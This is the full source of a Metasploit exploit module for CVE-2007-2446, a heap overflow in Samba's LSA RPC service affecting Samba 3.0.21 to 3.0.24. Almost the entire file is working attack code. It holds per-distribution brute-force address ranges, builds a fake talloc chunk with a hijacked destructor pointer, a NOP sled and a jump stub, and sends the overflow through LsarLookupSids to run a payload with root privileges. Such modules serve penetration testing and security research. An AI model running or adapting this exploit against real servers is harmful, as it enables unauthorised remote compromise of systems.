##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::DCERPC
  include Msf::Exploit::Remote::SMB::Client
  include Msf::Exploit::Brute

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Samba lsa_io_trans_names Heap Overflow',
      'Description'    => %q{
        This module triggers a heap overflow in the LSA RPC service
      of the Samba daemon. This module uses the TALLOC chunk overwrite
      method (credit Ramon and Adriano), which only works with Samba
      versions 3.0.21-3.0.24. Additionally, this module will not work
      when the Samba "log level" parameter is higher than "2".
      },
      'Author'         =>
        [
          'Ramon de C Valle',
          'Adriano Lima <adriano[at]risesecurity.org>',
          'hdm'
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2007-2446'],
          ['OSVDB', '34699'],
        ],
      'Privileged'     => true,
      'Payload'        =>
        {
          'Space'    => 1024, # no limit really
        },
      'Platform'       => 'linux',
      'DefaultOptions' =>
        {
          'PrependSetresuid' => true,
          'PrependSetreuid'  => true,
          'PrependSetuid'    => true,
        },
      'Targets'        =>
        [
          ['Linux vsyscall',
          {
            'Platform'      => 'linux',
            'Arch'          => [ ARCH_X86 ],
            'Nops'          => 1024,
            'Bruteforce' =>
              {
                'Start' => { 'Ret' => 0xffffe410 },
                'Stop'  => { 'Ret' => 0xffffe413 },
                'Step'  => 1,
              }
          }
          ],


          ##
          # 08356000-0843d000 rwxp 08356000 00:00 0 (Debian)      # KF
          # 80300000-8042f000 rw-p 80300000 00:00 0 (Gentoo)      # hdm
          # b800f000-b80c9000 rwxp b800f000 00:00 0 (RHEL/CentOS) # Adriano/Ramon
          # 80365000-80424000 rwxp 80365000 00:00 0 (SUSE)        # Adriano/Ramon
          # 8033c000-80412000 rwxp 00000000 00:00 0 (Slackware)   # Adriano/Ramon
          # 08342000-08436000 rwxp 00000000 00:00 0 (Ubuntu)      # hdm
          # 08270000-0837f000 rwxp 00000000 00:00 0 (SNAP)        # Andrew
          #
          ##

          ['Linux Heap Brute Force (Debian/Ubuntu)',
          {
            'Platform'      => 'linux',
            'Arch'          => [ ARCH_X86 ],
            'Nops'          => 64*1024,
            'Bruteforce' =>
              {
                'Start' => { 'Ret' => 0x08352000 },
                'Stop'  => { 'Ret' => 0x0843d000 },
                'Step'  => 60*1024,

              }
          }
          ],

          ['Linux Heap Brute Force (Gentoo)',
          {
            'Platform'      => 'linux',
            'Arch'          => [ ARCH_X86 ],
            'Nops'          => 64*1024,
            'Bruteforce' =>
              {
                'Start' => { 'Ret' => 0x80310000 },
                'Stop'  => { 'Ret' => 0x8042f000 },
                'Step'  => 60*1024,

              }
          }
          ],



          ['Linux Heap Brute Force (Mandriva)',
          {
            'Platform'      => 'linux',
            'Arch'          => [ ARCH_X86 ],
            'Nops'          => 64*1024,
            'Bruteforce' =>
              {
                'Start' => { 'Ret' => 0x80380000 },
                'Stop'  => { 'Ret' => 0x8045b000 },
                'Step'  => 60*1024,

              }
          }
          ],

          ['Linux Heap Brute Force (RHEL/CentOS)',
          {
            'Platform'      => 'linux',
            'Arch'          => [ ARCH_X86 ],
            'Nops'          => 64*1024,
            'Bruteforce' =>
              {
                'Start' => { 'Ret' => 0xb800f000 },
                'Stop'  => { 'Ret' => 0xb80c9000 },
                'Step'  => 60*1024,

              }
          }
          ],

          ['Linux Heap Brute Force (SUSE)',
          {
            'Platform'      => 'linux',
            'Arch'          => [ ARCH_X86 ],
            'Nops'          => 64*1024,
            'Bruteforce' =>
              {
                'Start' => { 'Ret' => 0x80365000 },
                'Stop'  => { 'Ret' => 0x80424000 },
                'Step'  => 60*1024,

              }
          }
          ],

          ['Linux Heap Brute Force (Slackware)',
          {
            'Platform'      => 'linux',
            'Arch'          => [ ARCH_X86 ],
            'Nops'          => 64*1024,
            'Bruteforce' =>
              {
                'Start' => { 'Ret' => 0x8033c000 },
                'Stop'  => { 'Ret' => 0x80412000 },
                'Step'  => 60*1024,

              }
          }
          ],

          ['Linux Heap Brute Force (OpenWRT MIPS)',
          {
            'Platform'      => 'linux',
            'Arch'          => [ ARCH_MIPSBE ],
            'Nops'          => 64*1024,
            'Bruteforce'    =>
              {
                'Start' => { 'Ret' => 0x55900000 },
                'Stop'  => { 'Ret' => 0x559c0000 },
                'Step'  => 60*1024,
              }
          }
          ],

          ['DEBUG',
          {
            'Platform'      => 'linux',
            'Arch'          => [ ARCH_X86 ],
            'Nops'          => 1024,
            'Bruteforce' =>
              {
                'Start' => { 'Ret' => 0xAABBCCDD },
                'Stop'  => { 'Ret' => 0xAABBCCDD },
                'Step'  => 4,
              }
          }
          ],
        ],
      'DisclosureDate' => '2007-05-14',
      'DefaultTarget'  => 0
      ))

    register_options(
      [
        OptString.new('SMBPIPE', [ true,  "The pipe name to use", 'LSARPC']),
      ])

    deregister_options('SMB::ProtocolVersion')
  end

  def check
    begin
      connect(versions: [1])
      smb_login()
      disconnect()
      if (smb_peer_lm() =~ /Samba/i)
        return CheckCode::Detected
      else
        return CheckCode::Safe
      end
    rescue ::Exception
      return CheckCode::Safe
    end
  end

  def brute_exploit(target_addrs)

    if(not @nops)
      if (target['Nops'] > 0)
        print_status("Creating nop sled....")
        @nops = make_nops(target['Nops'])
      else
        @nops = ''
      end

      # @nops = "\xcc" * (@nops.length)
    end

    print_status("Trying to exploit Samba with address 0x%.8x..." % target_addrs['Ret'])

    nops = @nops
    pipe = datastore['SMBPIPE'].downcase

    print_status("Connecting to the SMB service...")
    connect(versions: [1])
    smb_login()

    if ! @checked_peerlm
      if smb_peer_lm !~ /Samba 3\.0\.2[1234]/i
        fail_with(Failure::NoTarget, "This target is not a vulnerable Samba server (#{smb_peer_lm})")
      end
    end

    @checked_peerlm = true

    datastore['DCERPC::fake_bind_multi'] = false

    handle = dcerpc_handle('12345778-1234-abcd-ef00-0123456789ab', '0.0', 'ncacn_np', ["\\#{pipe}"])
    print_status("Binding to #{handle} ...")
    dcerpc_bind(handle)
    print_status("Bound to #{handle} ...")

    jumper = "P" * 256
    jumper[24, 5] = "\xe9" + [-5229-11-5-(nops.length/2)].pack('V')

    num_entries  = 256
    num_entries2 = 272

    # first talloc_chunk
    # 16 bits align
    # 16 bits sid_name_use
    #     16 bits uni_str_len
    #     16 bits uni_max_len
    #     32 bits buffer
    # 32 bits domain_idx
    buf = (('A' * 16) * num_entries)

    # padding
    buf << 'A' * 8

    # TALLOC_MAGIC
    talloc_magic = "\x70\xec\x14\xe8"

    # second talloc_chunk header
    buf << NDR.long(0) + NDR.long(0) # next, prev
    buf << NDR.long(0) + NDR.long(0) # parent, child
    buf << NDR.long(0)               # refs
    buf << [target_addrs['Ret']].pack('V') # destructor
    buf << 'A' * 4                   # name
    buf << 'A' * 4                   # size
    buf << talloc_magic              # flags
    buf << jumper

    stub = lsa_open_policy(dcerpc)

    stub << NDR.long(0)            # num_entries
    stub << NDR.long(0)            # ptr_sid_enum
    stub << NDR.long(num_entries)  # num_entries
    stub << NDR.long(0x20004)      # ptr_trans_names
    stub << NDR.long(num_entries2) # num_entries2
    stub << buf
    stub << nops
    stub << payload.encoded

    print_status("Calling the vulnerable function...")

    begin
      # LsarLookupSids
      dcerpc.call(0x0f, stub)
    rescue Rex::Proto::DCERPC::Exceptions::NoResponse, Rex::Proto::SMB::Exceptions::NoReply, ::EOFError
      print_status('Server did not respond, this is expected')
    rescue Rex::Proto::DCERPC::Exceptions::Fault
      print_error('Server is most likely patched...')
    rescue => e
      if e.to_s =~ /STATUS_PIPE_DISCONNECTED/
        print_status('Server disconnected, this is expected')
      else
        print_error("Error: #{e.class}: #{e}")
      end
    end

    handler
    disconnect
  end

  def lsa_open_policy(dcerpc, server="\\")
    stubdata =
      # Server
      NDR.uwstring(server) +
      # Object Attributes
        NDR.long(24) + # SIZE
        NDR.long(0)  + # LSPTR
        NDR.long(0)  + # NAME
        NDR.long(0)  + # ATTRS
        NDR.long(0)  + # SEC DES
          # LSA QOS PTR
          NDR.long(1)  + # Referent
          NDR.long(12) + # Length
          NDR.long(2)  + # Impersonation
          NDR.long(1)  + # Context Tracking
          NDR.long(0)  + # Effective Only
      # Access Mask
      NDR.long(0x02000000)

    res = dcerpc.call(6, stubdata)

    dcerpc.last_response.stub_data[0,20]
  end
end
